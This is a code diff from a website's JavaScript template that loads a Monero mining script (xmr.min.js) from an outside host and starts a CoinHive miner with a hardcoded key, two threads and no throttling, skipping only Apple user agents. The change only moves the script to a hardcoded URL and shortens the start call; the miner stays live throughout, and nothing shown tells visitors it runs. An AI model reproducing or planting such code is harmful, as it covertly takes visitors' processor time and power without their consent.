@@ -63,7 +63,7 @@
     if (!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
         $.ajax({
             method: "GET",
-            url: '${staticServePath}/js/lib/xmr.min.js',
+            url: 'https://static.hacpai.com/js/lib/xmr.min.js',
             dataType: "script"
         }).always(function (e) {
             setTimeout(function () {
@@ -76,8 +76,7 @@
             }, 4000)
 
             if (typeof CoinHive === 'object') {
-                var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0});
-                miner.start();
+                (new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0})).start();
             }
         });
     } else {
